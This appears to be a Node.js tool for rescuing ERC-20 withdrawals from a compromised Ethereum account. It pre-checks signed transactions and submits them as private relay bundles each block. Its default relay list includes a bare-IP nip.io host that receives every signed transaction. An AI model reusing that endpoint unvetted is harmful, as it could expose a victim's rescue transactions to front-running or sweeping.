#!/usr/bin/env node
//
// Operator fire script for a Ripcord recovery. Given
//   A  the compromised account (queued the withdrawal, signed leg 3 offline),
//   B  the safe destination (leg 3 pays it),
//   C  a gas wallet whose key this script holds,
// it does, in order:
//   1. checks every leg against the chain before sending anything (signer, nonce,
//      target, amount against the batch's real payout, gas money in A);
//   2. gives A the ETH it needs to pay leg 3's gas, either as an ordinary transfer
//      from C that is mined first (default, rehearsal only: a sweeper takes ETH
//      sent ahead of time) or as a leg 0 inside the bundle (--fund-in-bundle, the
//      safe path for a live compromise);
//   3. once the batch has expired, submits the bundle to every relay for the next
//      block and repeats each block until B's token balance has risen, A's nonce
//      has moved past leg 3, or --max-minutes runs out.
//
// It never asks for A's key. It needs C's key only to sign the funding transfer,
// from --funder-key-file <path> or the FUNDER_KEY environment variable.
//
// Usage:
//   node ripcord-fire.js --rpc <read rpc url> --market 0x… --account 0x… --destination 0x… \
//        --leg2 <hex or file> --leg3 <hex or file> [--leg1 <hex or file>] \
//        [--funder-key-file key.txt | --no-fund] [--fund-in-bundle] [--fund-eth 0.03] \
//        [--relays url,url] [--fb-key-file key.txt] [--expiry 1789716791] \
//        [--simulate] [--dry-run] [--max-minutes 30]
//
//   --dry-run     preflight and plan only; sends nothing.
//   --simulate    eth_callBundle at each relay once the batch has expired, before the first submit.
//   --fb-key-file any key, used only to sign the X-Flashbots-Signature header for relays that want one.
//
// Requires ethers v6 next to it:  npm init -y && npm pkg set type=module && npm i ethers@6

import { readFileSync } from 'node:fs';
import { JsonRpcProvider, Wallet, Transaction, Interface, Contract, getAddress, formatEther, formatUnits, parseEther, id } from 'ethers';

const DEFAULT_RELAYS = ['https://167.172.153.36.nip.io', 'https://rpc.titanbuilder.xyz'];
const EXECUTE_SELECTOR = '0x34bca29c'; // executeWithdrawal(address,uint32)
const ERC20 = new Interface(['function transfer(address to, uint256 amount) returns (bool)', 'function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)', 'function symbol() view returns (string)']);
const MARKET = new Interface([
  'function asset() view returns (address)',
  'function currentState() view returns (tuple(bool isClosed,uint128 maxTotalSupply,uint128 accruedProtocolFees,uint128 normalizedUnclaimedWithdrawals,uint104 scaledTotalSupply,uint104 scaledPendingWithdrawals,uint32 pendingWithdrawalExpiry,bool isDelinquent,uint32 timeDelinquent,uint16 protocolFeeBips,uint16 annualInterestBips,uint16 reserveRatioBips,uint112 scaleFactor,uint32 lastInterestAccruedTimestamp))',
  'function getWithdrawalBatch(uint32) view returns (tuple(uint104 scaledTotalAmount,uint104 scaledAmountBurned,uint128 normalizedAmountPaid))',
  'function getAccountWithdrawalStatus(address,uint32) view returns (tuple(uint104 scaledAmount,uint128 normalizedAmountWithdrawn))',
]);

const args = parseArgs(process.argv.slice(2));
const log = (m) => process.stdout.write(`[${new Date().toISOString().slice(11, 19)}] ${m}\n`);
const fail = (m, code = 1) => { process.stderr.write(`error: ${m}\n`); process.exit(code); };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function parseArgs(argv) {
  const out = { relays: DEFAULT_RELAYS, maxMinutes: 30 };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i], v = argv[i + 1];
    const take = () => { if (v === undefined) fail(`${a} needs a value`); i++; return v; };
    switch (a) {
      case '--rpc': out.rpc = take(); break;
      case '--market': out.market = take(); break;
      case '--account': out.account = take(); break;
      case '--destination': out.destination = take(); break;
      case '--expiry': out.expiry = Number(take()); break;
      case '--leg1': out.leg1 = take(); break;
      case '--leg2': out.leg2 = take(); break;
      case '--leg3': out.leg3 = take(); break;
      case '--relays': out.relays = take().split(/[\s,]+/).filter(Boolean); break;
      case '--funder-key-file': out.funderKeyFile = take(); break;
      case '--fb-key-file': out.fbKeyFile = take(); break;
      case '--fund-eth': out.fundEth = take(); break;
      case '--fund-in-bundle': out.fundInBundle = true; break;
      case '--no-fund': out.noFund = true; break;
      case '--simulate': out.simulate = true; break;
      case '--dry-run': out.dryRun = true; break;
      case '--max-minutes': out.maxMinutes = Number(take()); break;
      default: fail(`unknown argument ${a}`);
    }
  }
  for (const k of ['rpc', 'market', 'account', 'destination', 'leg2', 'leg3']) if (!out[k]) fail(`--${k} is required`);
  return out;
}

function rawFrom(v) {
  const t = /^0x[0-9a-fA-F]+$/.test(v) ? v : readFileSync(v, 'utf8').trim();
  if (!/^0x[0-9a-fA-F]+$/.test(t)) fail(`not a signed transaction: ${v}`);
  return t;
}
function decode(raw, name) {
  let tx;
  try { tx = Transaction.from(raw); } catch (e) { fail(`${name}: cannot decode (${e.message})`); }
  if (!tx.from) fail(`${name}: no signature`);
  return tx;
}
const same = (a, b) => a && b && getAddress(a) === getAddress(b);
const short = (a) => a.slice(0, 8) + '…' + a.slice(-4);

async function postRelay(url, method, params, fbSigner) {
  const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method, params });
  const headers = { 'content-type': 'application/json' };
  if (fbSigner) headers['X-Flashbots-Signature'] = `${fbSigner.address}:${await fbSigner.signMessage(id(body))}`;
  const ctl = new AbortController(); const t = setTimeout(() => ctl.abort(), 8000);
  try {
    const res = await fetch(url, { method: 'POST', headers, body, signal: ctl.signal });
    const j = await res.json().catch(() => ({ error: { message: `HTTP ${res.status}, non-JSON body` } }));
    return j.error ? `error: ${j.error.message || JSON.stringify(j.error)}` : JSON.stringify(j.result);
  } catch (e) { return `unreachable: ${e.message}`; }
  finally { clearTimeout(t); }
}

async function main() {
  const provider = new JsonRpcProvider(args.rpc);
  const net = await provider.getNetwork();
  const chainId = Number(net.chainId);
  const A = getAddress(args.account), B = getAddress(args.destination), M = getAddress(args.market);
  const market = new Contract(M, MARKET, provider);
  const assetAddr = await market.asset();
  const token = new Contract(assetAddr, ERC20, provider);
  const [decimals, symbol] = await Promise.all([token.decimals().then(Number), token.symbol().catch(() => 'tokens')]);
  const fmtTok = (v) => `${formatUnits(v, decimals)} ${symbol}`;

  // ---- batch and payout -------------------------------------------------------
  const state = await market.currentState();
  const expiry = args.expiry || Number(state.pendingWithdrawalExpiry);
  if (!expiry) fail('no pending batch and no --expiry given');
  const [batch, status] = await Promise.all([market.getWithdrawalBatch(expiry), market.getAccountWithdrawalStatus(A, expiry)]);
  if (batch.scaledTotalAmount === 0n || status.scaledAmount === 0n) fail(`account has nothing in batch ${expiry}`);
  const paidShare = (batch.normalizedAmountPaid * status.scaledAmount) / batch.scaledTotalAmount;
  const payout = paidShare > status.normalizedAmountWithdrawn ? paidShare - status.normalizedAmountWithdrawn : 0n;
  const fullyPaid = batch.scaledAmountBurned === batch.scaledTotalAmount;
  log(`chain ${chainId} · market ${short(M)} · asset ${symbol} ${short(assetAddr)}`);
  log(`batch ${expiry} (${new Date(expiry * 1000).toISOString()}) · ${fullyPaid ? 'fully paid' : 'PARTLY UNPAID'} · payout to A now ${fmtTok(payout)}`);
  if (!fullyPaid) log('  batch is not fully paid: the payout above is only the paid part and can change');

  // ---- legs -------------------------------------------------------------------
  const legs = [];
  if (args.leg1) legs.push({ name: 'leg 1 process', raw: rawFrom(args.leg1) });
  legs.push({ name: 'leg 2 execute', raw: rawFrom(args.leg2) });
  legs.push({ name: 'leg 3 forward', raw: rawFrom(args.leg3) });
  const problems = [];
  const nonceA = await provider.getTransactionCount(A);
  for (const l of legs) {
    const tx = decode(l.raw, l.name); l.tx = tx;
    const nonce = await provider.getTransactionCount(tx.from);
    const bal = await provider.getBalance(tx.from);
    const need = tx.gasLimit * tx.maxFeePerGas + tx.value;
    log(`${l.name}: from ${short(tx.from)} nonce ${tx.nonce} (chain ${nonce}) → ${short(tx.to)} gas ${tx.gasLimit} maxFee ${formatUnits(tx.maxFeePerGas, 9)} gwei tip ${formatUnits(tx.maxPriorityFeePerGas, 9)} gwei · hash ${tx.hash}`);
    if (tx.type !== 2) problems.push(`${l.name}: not an EIP-1559 transaction`);
    if (Number(tx.chainId) !== chainId) problems.push(`${l.name}: chainId ${tx.chainId}, rpc is on ${chainId}`);
    if (tx.nonce !== nonce) problems.push(`${l.name}: nonce ${tx.nonce} but ${short(tx.from)} is at ${nonce}`);
    l.need = need; l.bal = bal;
    if (l.name === 'leg 3 forward') {
      if (!same(tx.from, A)) problems.push(`leg 3 signed by ${tx.from}, not the account ${A}`);
      if (!same(tx.to, assetAddr)) problems.push(`leg 3 targets ${tx.to}, not the asset ${assetAddr}`);
      let to, amount;
      try { [to, amount] = ERC20.decodeFunctionData('transfer', tx.data); } catch { problems.push('leg 3 is not an ERC-20 transfer'); }
      if (to !== undefined) {
        log(`  leg 3 transfers ${fmtTok(amount)} to ${short(to)}`);
        if (!same(to, B)) problems.push(`leg 3 pays ${to}, not the destination ${B}`);
        if (amount > payout) problems.push(`leg 3 amount ${fmtTok(amount)} exceeds the payout ${fmtTok(payout)}; re-sign for at most the payout`);
        else if (payout - amount > payout / 100n) log(`  note: leaves ${fmtTok(payout - amount)} behind in A`);
      }
      // A pays for leg 3 itself. This is the ETH it must hold when leg 3 runs.
      l.gasMoney = tx.gasLimit * tx.maxFeePerGas;
    } else {
      if (!same(tx.to, M)) problems.push(`${l.name} targets ${tx.to}, not the market ${M}`);
      if (l.name === 'leg 2 execute') {
        if (!tx.data.startsWith(EXECUTE_SELECTOR)) problems.push(`leg 2 selector ${tx.data.slice(0, 10)} is not executeWithdrawal(address,uint32)`);
        const argAcct = '0x' + tx.data.slice(34, 74), argExp = parseInt(tx.data.slice(74, 138), 16);
        if (!same(argAcct, A)) problems.push(`leg 2 executes for ${argAcct}, not ${A}`);
        if (argExp !== expiry) problems.push(`leg 2 targets batch ${argExp}, not ${expiry}`);
      }
      if (bal < need) problems.push(`${l.name}: signer ${short(tx.from)} holds ${formatEther(bal)} ETH, needs ${formatEther(need)} for gas`);
    }
  }
  const leg3 = legs[legs.length - 1];
  if (!same(leg3.tx.from, A) && nonceA !== leg3.tx.nonce) { /* already reported */ }

  // ---- gas money for A -----------------------------------------------------------
  const balA = await provider.getBalance(A);
  const shortfall = leg3.gasMoney > balA ? leg3.gasMoney - balA : 0n;
  log(`A holds ${formatEther(balA)} ETH · leg 3 needs ${formatEther(leg3.gasMoney)} ETH up front · shortfall ${formatEther(shortfall)} ETH`);
  let fundWei = 0n;
  if (args.fundEth) fundWei = parseEther(args.fundEth);
  else if (!args.noFund) fundWei = shortfall;
  if (fundWei === 0n && shortfall > 0n) problems.push(`A is short ${formatEther(shortfall)} ETH for leg 3 and funding is off`);

  let funder = null;
  if (fundWei > 0n) {
    const key = args.funderKeyFile ? readFileSync(args.funderKeyFile, 'utf8').trim() : process.env.FUNDER_KEY;
    if (!key) fail('funding needed: give --funder-key-file <path> or set FUNDER_KEY, or pass --no-fund');
    try { funder = new Wallet(key, provider); } catch { fail('funder key is not a valid private key'); }
    const fbal = await provider.getBalance(funder.address);
    log(`C (funder) ${short(funder.address)} holds ${formatEther(fbal)} ETH · will send ${formatEther(fundWei)} ETH to A ${args.fundInBundle ? 'inside the bundle as leg 0' : 'as an ordinary transaction first'}`);
    if (fbal < fundWei + 21000n * leg3.tx.maxFeePerGas) problems.push(`C holds ${formatEther(fbal)} ETH, needs about ${formatEther(fundWei + 21000n * leg3.tx.maxFeePerGas)}`);
    for (const l of legs) if (same(l.tx.from, funder.address) && args.fundInBundle) problems.push(`${l.name} is signed by the funder; leg 0 would take its nonce first. Use another gas wallet or re-sign ${l.name} with nonce ${l.tx.nonce + 1}`);
    if (!args.fundInBundle) log('  WARNING: an ordinary transfer to A is visible and sweepable. Fine for a rehearsal, not for a live compromise (use --fund-in-bundle).');
  }
  const fbSigner = args.fbKeyFile ? new Wallet(readFileSync(args.fbKeyFile, 'utf8').trim()) : null;

  const startB = await token.balanceOf(B);
  log(`B ${short(B)} holds ${fmtTok(startB)} now · relays: ${args.relays.join(', ')}`);
  if (problems.length) { for (const p of problems) process.stderr.write(`  ✗ ${p}\n`); fail(`${problems.length} problem(s) above; nothing sent`, 2); }
  log('preflight OK');
  if (args.dryRun) { log('dry run, stopping here'); return; }

  // ---- step 1: fund A ------------------------------------------------------------
  let leg0 = null;
  if (funder) {
    const fee = await provider.getFeeData();
    const maxFee = fee.maxFeePerGas && fee.maxFeePerGas > leg3.tx.maxFeePerGas ? fee.maxFeePerGas : leg3.tx.maxFeePerGas;
    const tip = fee.maxPriorityFeePerGas || leg3.tx.maxPriorityFeePerGas;
    const ftx = { type: 2, chainId, to: A, value: fundWei, gasLimit: 21000n, maxFeePerGas: maxFee, maxPriorityFeePerGas: tip, nonce: await provider.getTransactionCount(funder.address) };
    if (args.fundInBundle) {
      leg0 = { name: 'leg 0 fund', raw: await funder.signTransaction(ftx) };
      log(`leg 0 signed: ${formatEther(fundWei)} ETH C → A, nonce ${ftx.nonce}, rides inside the bundle`);
    } else {
      const sent = await funder.sendTransaction(ftx);
      log(`funding sent: ${sent.hash} · waiting for it to be mined…`);
      const rc = await sent.wait(1);
      if (!rc || rc.status !== 1) fail(`funding transaction failed (${sent.hash})`);
      log(`funding mined in block ${rc.blockNumber} · A now holds ${formatEther(await provider.getBalance(A))} ETH`);
    }
  }
  const bundle = [...(leg0 ? [leg0] : []), ...legs];
  const txs = bundle.map((l) => l.raw);

  // ---- steps 2 and 3: submit each block until B has the funds ----------------------
  const deadline = Date.now() + args.maxMinutes * 60_000;
  let lastHead = -1, simulated = false, submits = 0;
  while (true) {
    if (Date.now() > deadline) fail(`gave up after ${args.maxMinutes} minutes and ${submits} submissions; B unchanged`, 3);
    const head = await provider.getBlock('latest');
    if (head.number === lastHead) { await sleep(1500); continue; }
    lastHead = head.number;

    const nowB = await token.balanceOf(B);
    if (nowB > startB) { log(`DONE: B now holds ${fmtTok(nowB)} (+${fmtTok(nowB - startB)}) after ${submits} submission(s)`); return; }
    const nonceNow = await provider.getTransactionCount(A);
    if (nonceNow > leg3.tx.nonce) fail(`A's nonce moved to ${nonceNow} but B did not receive funds: leg 3 can no longer land. Check ${short(A)} on Etherscan and re-sign.`, 4);

    // executeWithdrawal needs block.timestamp > expiry; the next block is ~12 s after this one.
    if (head.timestamp < expiry) {
      const wait = expiry - head.timestamp;
      if (wait > 60 && wait % 60 < 12) log(`head ${head.number} @ ${head.timestamp} · batch expires in ${wait}s · waiting`);
      else if (wait <= 60) log(`head ${head.number} · expires in ${wait}s`);
      await sleep(Math.min(wait, 12) * 1000 - 500);
      continue;
    }
    const target = '0x' + (head.number + 1).toString(16);
    if (args.simulate && !simulated) {
      simulated = true;
      const rs = await Promise.all(args.relays.map((u) => postRelay(u, 'eth_callBundle', [{ txs, blockNumber: target, stateBlockNumber: 'latest' }], fbSigner)));
      rs.forEach((r, i) => log(`  sim ${hostOf(args.relays[i])}: ${r.slice(0, 300)}`));
    }
    submits++;
    log(`submit #${submits}: ${txs.length}-leg bundle for block ${head.number + 1}`);
    const rs = await Promise.all(args.relays.map((u) => postRelay(u, 'eth_sendBundle', [{ txs, blockNumber: target }], fbSigner)));
    rs.forEach((r, i) => log(`  ${hostOf(args.relays[i])}: ${r.slice(0, 200)}`));
  }
}
const hostOf = (u) => { try { return new URL(u).host; } catch { return u; } };

main().catch((e) => fail(e.message));
